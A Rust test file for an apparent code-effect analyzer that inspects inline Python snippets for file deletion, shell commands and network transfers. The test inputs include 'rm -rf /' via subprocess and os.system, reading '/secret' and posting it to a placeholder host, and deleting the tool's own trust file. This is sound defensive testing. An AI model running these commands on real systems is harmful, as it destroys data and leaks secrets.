use nah_inline::{
    InlineInput, InlineRefusal, LanguageAnalysis, LanguageCallKind, NestedExecution,
    ProtectionInput, analyze_with_language_effects,
};
use nah_proto::{
    action::{FilesystemOperation, InvocationInput},
    ctx::Platform,
};
use serde_json::json;

fn analyze(code: &str) -> LanguageAnalysis {
    analyze_with_language_effects(
        InlineInput {
            program: "python3",
            code,
            home: "/home/dev",
            platform: Platform::Linux,
        },
        ProtectionInput {
            critical_paths: &[],
            ambient_variables: &[],
        },
    )
}

fn native(call: &nah_inline::LanguageCall) -> (&serde_json::Value, bool) {
    let InvocationInput::Native { value, complete } = call.input() else {
        panic!("language calls must use Native input")
    };
    (value, *complete)
}

fn callable(call: &nah_inline::LanguageCall) -> &str {
    native(call).0["callable"].as_str().unwrap()
}

#[test]
fn direct_file_call_uses_the_frozen_native_contract() {
    let analysis = analyze("import os\nos.remove('/tmp/x')");
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 1);
    assert_eq!(calls[0].kind(), LanguageCallKind::DirectFile);
    assert_eq!(
        native(&calls[0]),
        (
            &json!({
                "v": 1,
                "language": "python",
                "callable": "os.remove",
                "positional": [{"kind": "string", "value": "/tmp/x"}],
                "keywords": [],
            }),
            true,
        )
    );
    assert_eq!(calls[0].filesystems().len(), 1);
    assert_eq!(calls[0].filesystems()[0].requested(), Some("/tmp/x"));
    assert_eq!(
        calls[0].filesystems()[0].operation(),
        FilesystemOperation::Delete
    );
    assert!(analysis.draft().complete());
}

#[test]
fn unresolved_known_sink_is_explicit_and_partial() {
    let analysis = analyze("import os\nos.remove(target)");
    let call = &analysis.draft().calls()[0];
    assert_eq!(call.filesystems()[0].requested(), None);
    assert_eq!(
        native(call),
        (
            &json!({
                "v": 1,
                "language": "python",
                "callable": "os.remove",
                "positional": [{"kind": "unknown"}],
                "keywords": [],
            }),
            false,
        )
    );
    assert!(!analysis.draft().complete());
}

#[test]
fn unknown_and_rebound_calls_do_not_invent_effects() {
    assert!(
        analyze("plugin.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
    assert!(
        analyze("import os\nos.remove = lambda path: None\nos.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
}

#[test]
fn known_names_with_non_executable_argument_shapes_do_not_emit() {
    let analysis = analyze(
        "import os, requests, subprocess\nfrom pathlib import Path\nos.remove()\nos.remove(42)\nos.system()\nos.system(False)\nrequests.get()\nrequests.get(42)\nsubprocess.run(42)\nsubprocess.run(['echo'], note='invalid')\nPath('/tmp/x').write_text()",
    );
    assert!(analysis.draft().calls().is_empty());
    assert!(analysis.draft().complete());
}

#[test]
fn exact_dead_branch_emits_no_call_and_unknown_branch_retains_modality() {
    assert!(
        analyze("import os\nif False:\n    os.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
    let analysis = analyze("import os\nif condition:\n    os.remove('/tmp/x')");
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(analysis.draft().calls()[0].conditional_depth(), 1);
    assert!(!analysis.draft().complete());

    let analysis = analyze(
        "import os\nif condition:\n    os.remove('/tmp/x')\n    os.remove('/tmp/y')\nelse:\n    os.remove('/tmp/z')",
    );
    let calls = analysis.draft().calls();
    assert!(calls[0].execution_dominators().is_empty());
    assert_eq!(calls[1].execution_dominators(), &[0]);
    assert!(calls[2].execution_dominators().is_empty());
}

#[test]
fn read_provenance_flows_to_file_and_network_consumers() {
    let analysis = analyze(
        "from pathlib import Path\nimport requests\ndata = Path('/secret').read_text()\nPath('/out').write_text(data)\nrequests.post('https://example.test/x', data=data)",
    );
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 3);
    assert_eq!(
        calls[0].filesystems()[0].operation(),
        FilesystemOperation::Read
    );
    assert_eq!(
        calls[1].filesystems()[0].operation(),
        FilesystemOperation::Write
    );
    assert_eq!(calls[2].kind(), LanguageCallKind::NetworkTransfer);
    assert_eq!(calls[2].endpoint(), Some("https://example.test/x"));
    assert_eq!(
        analysis
            .draft()
            .flows()
            .iter()
            .map(|flow| (flow.from(), flow.to()))
            .collect::<Vec<_>>(),
        vec![(0, 1), (0, 2)]
    );
}

#[test]
fn move_and_link_calls_preserve_identity() {
    let analysis = analyze(
        "import os, shutil\nos.rename('/a', '/b')\nos.link('/a', '/b')\nshutil.move('/a', '/b')",
    );
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 3);
    assert_eq!(calls[0].filesystems().len(), 2);
    assert_eq!(
        calls[0].filesystems()[0].operation(),
        FilesystemOperation::Delete
    );
    assert_eq!(
        calls[0].filesystems()[1].operation(),
        FilesystemOperation::Write
    );
    assert_eq!(calls[0].filesystems()[1].identity_path(), Some("/a"));
    assert!(!calls[0].filesystems()[1].identity_requires_missing_target());
    assert_eq!(calls[1].filesystems().len(), 1);
    assert_eq!(calls[1].filesystems()[0].identity_path(), Some("/a"));
    assert!(calls[1].filesystems()[0].identity_requires_missing_target());
    assert_eq!(calls[2].filesystems()[1].identity_path(), Some("/a"));
    assert!(analysis.draft().complete());
}

#[test]
fn oversized_collection_becomes_unknown_without_growing_the_contract() {
    let values = (0..65)
        .map(|value| format!("'{value}'"))
        .collect::<Vec<_>>()
        .join(",");
    let analysis = analyze(&format!("import subprocess\nsubprocess.run([{values}])"));
    let call = &analysis.draft().calls()[0];
    let (value, complete) = native(call);
    assert_eq!(value["positional"], json!([{"kind": "unknown"}]));
    assert!(!complete);
}

#[test]
fn current_truthiness_try_class_and_divergence_control_effect_reachability() {
    for code in [
        "import os\nif []:\n    os.remove('/tmp/x')",
        "import os\nif {}:\n    os.remove('/tmp/x')",
        "import os\ntry:\n    pass\nexcept:\n    os.remove('/tmp/x')",
        "import os\nwhile True:\n    pass\nos.remove('/tmp/x')",
    ] {
        assert!(analyze(code).draft().calls().is_empty(), "{code}");
    }

    for code in [
        "import os\ntry:\n    raise RuntimeError()\nexcept:\n    os.remove('/tmp/x')",
        "import os\nclass Cleanup:\n    os.remove('/tmp/x')",
    ] {
        let analysis = analyze(code);
        assert_eq!(analysis.draft().calls().len(), 1, "{code}");
        assert_eq!(callable(&analysis.draft().calls()[0]), "os.remove");
    }
}

#[test]
fn dynamic_code_keeps_mode_isolation_and_defining_source_identity() {
    assert!(
        analyze("eval(\"import os; os.remove('/tmp/x')\")")
            .draft()
            .calls()
            .is_empty()
    );

    for code in [
        "exec(\"import os; os.remove('/tmp/x')\")",
        "eval(compile(\"import os; os.remove('/tmp/x')\", 'nested.py', 'exec'))",
        "exec(\"def cleanup():\\n import os\\n os.remove('/tmp/x')\")\ncleanup()",
    ] {
        let analysis = analyze(code);
        assert_eq!(analysis.draft().calls().len(), 1, "{code}");
        assert_eq!(callable(&analysis.draft().calls()[0]), "os.remove");
    }

    assert!(
        analyze("exec(\"import os\", {}, {})\nos.remove('/tmp/x')")
            .draft()
            .calls()
            .is_empty()
    );
}

#[test]
fn local_function_binding_and_branch_identity_gate_effects() {
    for code in [
        "import os\ndef danger(required):\n    os.remove('/tmp/x')\ndanger()",
        "import os\ndef danger(value):\n    os.remove('/tmp/x')\ndanger(1, 2)",
        "import os\ndef danger(value):\n    os.remove('/tmp/x')\ndanger(other=1)",
        "import os\nif condition:\n    def action(): os.remove('/tmp/x')\nelse:\n    def action(): pass\naction()",
    ] {
        assert!(analyze(code).draft().calls().is_empty(), "{code}");
    }

    for code in [
        "import os\ndef danger(path='/tmp/x'): os.remove(path)\ndanger()",
        "import os\ndef danger(path): os.remove(path)\ndanger(path='/tmp/x')",
        "import os\ndef action(): os.remove('/tmp/x')\nif condition:\n    alias=action\nelse:\n    alias=action\nalias()",
    ] {
        let analysis = analyze(code);
        assert_eq!(analysis.draft().calls().len(), 1, "{code}");
        assert_eq!(callable(&analysis.draft().calls()[0]), "os.remove");
    }
}

#[test]
fn local_function_cell_mutations_reach_native_call_evidence() {
    let analysis = analyze(
        "import subprocess\nargv=['rm']\nalias=argv\ndef finish(parts): parts.extend(['-rf','/'])\nfinish(alias)\nsubprocess.run(argv)",
    );
    let call = &analysis.draft().calls()[0];
    assert_eq!(
        native(call),
        (
            &json!({
                "v": 1,
                "language": "python",
                "callable": "subprocess.run",
                "positional": [{
                    "kind": "sequence",
                    "items": [
                        {"kind": "string", "value": "rm"},
                        {"kind": "string", "value": "-rf"},
                        {"kind": "string", "value": "/"},
                    ],
                }],
                "keywords": [],
            }),
            true,
        )
    );
}

#[test]
fn mutations_and_formatted_conversions_never_reuse_exact_sink_values() {
    for mutation in ["argv[0]='echo'", "argv.clear()"] {
        let analysis = analyze(&format!(
            "import subprocess\nargv=['rm','-rf','/']\n{mutation}\nsubprocess.run(argv)"
        ));
        assert_eq!(analysis.draft().calls().len(), 1, "{mutation}");
        let (value, complete) = native(&analysis.draft().calls()[0]);
        assert_eq!(value["positional"], json!([{"kind": "unknown"}]));
        assert!(!complete);
        assert!(analysis.report().nested_executions().is_empty());
    }

    assert!(
        analyze("import os\napi=os\nos.system=safe\napi.system('rm -rf /')")
            .draft()
            .calls()
            .is_empty()
    );

    let analysis = analyze("import os\ntarget='/'\nos.remove(f'{target!r}')");
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(
        analysis.draft().calls()[0].filesystems()[0].requested(),
        None
    );
    assert!(!analysis.draft().complete());
}

#[test]
fn speculative_loop_else_sites_emit_once_without_cross_branch_dominators() {
    let analysis = analyze(
        "import os\nfor item in items:\n    os.remove('/tmp/body')\nelse:\n    os.remove('/tmp/else')",
    );
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 2);
    assert_eq!(callable(&calls[0]), "os.remove");
    assert_eq!(callable(&calls[1]), "os.remove");
    assert_eq!(calls[0].filesystems()[0].requested(), Some("/tmp/body"));
    assert_eq!(calls[1].filesystems()[0].requested(), Some("/tmp/else"));
    assert!(calls[0].execution_dominators().is_empty());
    assert!(calls[1].execution_dominators().is_empty());
    assert_eq!(calls[0].conditional_depth(), 1);
    assert_eq!(calls[1].conditional_depth(), 1);
}

#[test]
fn short_circuit_and_chained_comparison_sinks_stay_conditional() {
    let analysis = analyze(
        "from pathlib import Path\nimport os\nPath('/tmp/input').read_text() and os.remove('/tmp/output')",
    );
    let calls = analysis.draft().calls();
    assert_eq!(calls.len(), 2);
    assert_eq!(calls[0].conditional_depth(), 0);
    assert_eq!(calls[1].conditional_depth(), 1);
    assert_eq!(calls[1].execution_dominators(), &[0]);

    let analysis = analyze("import os\ncondition < 1 < os.remove('/tmp/output')");
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(analysis.draft().calls()[0].conditional_depth(), 1);
    assert!(!analysis.draft().complete());
}

#[test]
fn interpreter_value_bounds_cannot_expand_native_evidence() {
    let values = (0..257)
        .map(|value| format!("'{value}'"))
        .collect::<Vec<_>>()
        .join(",");
    let analysis = analyze(&format!("import subprocess\nsubprocess.run([{values}])"));
    assert_eq!(analysis.report().refusals(), [InlineRefusal::WorkLimit]);
    let call = &analysis.draft().calls()[0];
    let (value, complete) = native(call);
    assert_eq!(value["positional"], json!([{"kind": "unknown"}]));
    assert!(!complete);
    assert!(serde_json::to_vec(value).unwrap().len() < 1024 * 1024);
}

#[test]
fn possible_cwd_mutation_only_widens_later_relative_targets() {
    for code in [
        "import os\nos.chdir('/tmp')\nos.remove('cache')",
        "import os\nplugin()\nos.remove('cache')",
        "import os\ndef change(): plugin()\nchange()\nos.remove('cache')",
        "import os\nif condition: plugin()\nos.remove('cache')",
        "import os\nexec(\"plugin()\", {})\nos.remove('cache')",
    ] {
        let analysis = analyze(code);
        assert_eq!(analysis.draft().calls().len(), 1, "{code}");
        assert_eq!(
            analysis.draft().calls()[0].filesystems()[0].requested(),
            None,
            "{code}"
        );
        assert!(!analysis.draft().complete(), "{code}");
    }

    let analysis = analyze("import os\nplugin()\nos.remove('/tmp/cache')");
    assert_eq!(
        analysis.draft().calls()[0].filesystems()[0].requested(),
        Some("/tmp/cache")
    );
}

#[test]
fn local_abrupt_control_stops_unreachable_effects_and_remains_catchable() {
    for code in [
        "import os\ndef stop(): raise RuntimeError()\nstop()\nos.remove('/tmp/x')",
        "import os\ndef stop():\n    while True: pass\nstop()\nos.remove('/tmp/x')",
        "import os\ndef stop(): raise RuntimeError()\nwrapper(stop(), os.remove('/tmp/x'))",
    ] {
        assert!(analyze(code).draft().calls().is_empty(), "{code}");
    }

    let analysis = analyze(
        "import os\ndef stop(): raise RuntimeError()\ntry:\n    stop()\nexcept:\n    os.remove('/tmp/caught')\nos.remove('/tmp/tail')",
    );
    assert_eq!(analysis.draft().calls().len(), 2);
    assert_eq!(
        analysis
            .draft()
            .calls()
            .iter()
            .map(callable)
            .collect::<Vec<_>>(),
        ["os.remove", "os.remove"]
    );

    let analysis = analyze(
        "import os\nvalue='safe'\ndef stop(): raise RuntimeError()\ntry:\n    value=stop()\nexcept:\n    pass\nos.system(value)",
    );
    assert!(matches!(
        analysis.report().nested_executions(),
        [NestedExecution::Shell { code, .. }] if code == "safe"
    ));

    let analysis =
        analyze("import os\nos.execl('/bin/true', 'true')\nos.remove('/tmp/unreachable')");
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(callable(&analysis.draft().calls()[0]), "os.execl");
}

#[test]
fn terminated_unknown_branch_state_never_flows_into_the_fallthrough() {
    let analysis = analyze(
        "from pathlib import Path\nimport requests\ndef send():\n    data='safe'\n    if condition:\n        data=Path('/secret').read_text()\n        return\n    requests.post('https://example.test', data=data)\nsend()",
    );
    assert_eq!(analysis.draft().calls().len(), 2);
    assert_eq!(
        callable(&analysis.draft().calls()[0]),
        "pathlib.path.read_text"
    );
    assert_eq!(callable(&analysis.draft().calls()[1]), "requests.post");
    assert!(analysis.draft().flows().is_empty());
}

#[test]
fn binders_and_deletion_never_reuse_stale_module_ownership() {
    for code in [
        "import os\nwith open('/dev/null') as os:\n    os.remove('/tmp/x')",
        "import os\ndel os\nos.remove('/tmp/x')",
        "import os\nmatch 1:\n    case os: pass\nos.remove('/tmp/x')",
    ] {
        assert!(
            analyze(code)
                .draft()
                .calls()
                .iter()
                .all(|call| callable(call) != "os.remove"),
            "{code}"
        );
    }
}

#[test]
fn shared_module_and_environment_mutations_invalidate_exact_ownership() {
    for code in [
        "import os\ndef configure(): setattr(os, 'remove', lambda path: None)\nconfigure()\nos.remove('/tmp/x')",
        "import os\ndef configure(): os.remove = harmless\nconfigure()\nos.remove('/tmp/x')",
        "import os\nclass Configure:\n    os.remove = harmless\nos.remove('/tmp/x')",
        "import os\nexec(\"os.remove = harmless\")\nos.remove('/tmp/x')",
    ] {
        assert!(analyze(code).draft().calls().is_empty(), "{code}");
    }

    for mutation in [
        "os.environ.update({'HOME': '/tmp'})",
        "os.environ.pop('HOME')",
        "os.environ['HOME'] = '/tmp'",
    ] {
        let code =
            format!("import os\n{mutation}\nos.remove(os.getenv('HOME') + '/.nah/trust.json')");
        let analysis = analyze(&code);
        assert_eq!(analysis.draft().calls().len(), 1, "{code}");
        assert_eq!(callable(&analysis.draft().calls()[0]), "os.remove");
        assert_eq!(
            analysis.draft().calls()[0].filesystems()[0].requested(),
            None,
            "{code}"
        );
    }
}

#[test]
fn read_only_local_module_arguments_preserve_ownership() {
    let analysis = analyze(
        "import os\ndef inspect_module(module): pass\ninspect_module(os)\nos.remove('/tmp/x')",
    );
    assert_eq!(analysis.draft().calls().len(), 1);
    assert_eq!(callable(&analysis.draft().calls()[0]), "os.remove");
}
